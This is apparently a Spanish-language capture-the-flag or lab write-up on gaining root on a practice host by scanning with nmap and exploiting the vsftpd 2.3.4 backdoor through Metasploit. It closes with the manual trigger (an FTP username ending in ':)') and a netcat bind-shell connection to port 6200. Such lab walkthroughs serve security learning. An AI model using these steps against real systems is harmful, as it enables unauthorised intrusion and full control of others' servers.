Primero buscamos que servicios está exponiendo el servidor 172.17.0.2, el cual utilizaremos el siguiente comando
```
nmap -Pn -sV -sC -p- 172.17.0.2
```
Con eso obtenemos la siguiente información:

| Port | State | Service | Version             |
| ---- | ----- | ------- | ------------------- |
| 21   | Open  | ftp     | vsftpd 2.3.4        |
| 80   | Open  | http    | Apache httpd 2.4.58 |
Con eso podemos realizar la busqueda para el puerto 21:
```
searchsploit "vsftpd 2.3.4"
```
Nos da como resultado:

| Exploit Tittle                                         | Path                 |
| ------------------------------------------------------ | -------------------- |
| vsftpd 2.3.4 - Backdoor Command Execution              | unix/remote/49757.py |
| vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb |
Y para el puerto 80:
```
searchsploit "apache httpd 2.4.58"
```
Nos da como resultado:
Exploits: No Results
Shellcodes: No Results
Papers: No Results

Por lo tanto realizaremos la busqueda del exploit en ***msfconsole***, utilizaremos el siguiente comando:
```
search exploit vsftpd 2.3.4
```
El cual nos dará un solo resultado, el cual es de la fecha: ***2011-07-03***, haremos uso de ese con el siguiente comando:
```
use [nombre completo]
```
Procederemos a realizar la configuraciones pertinentes, pero antes de eso, debemos ver que información necesitamos y que información se necesita, lo haremos con el siguiente comando:
```
show options
```
Configuraremos:
* RHOSTS
* LHOST
## Conclusiones
La neta estaba bien raro, era necesario realizar una acción al conectarse por ftp, el cual en el usuario podias poner:
```
[cualquiercosa]:)
```
Luego en otra tener una bind shell, el cual es la que se conecta directamente, utilizaremos netcat:
```
nc 172.17.0.2 6200
```

Y listo, hemos obtenido privilegios root.
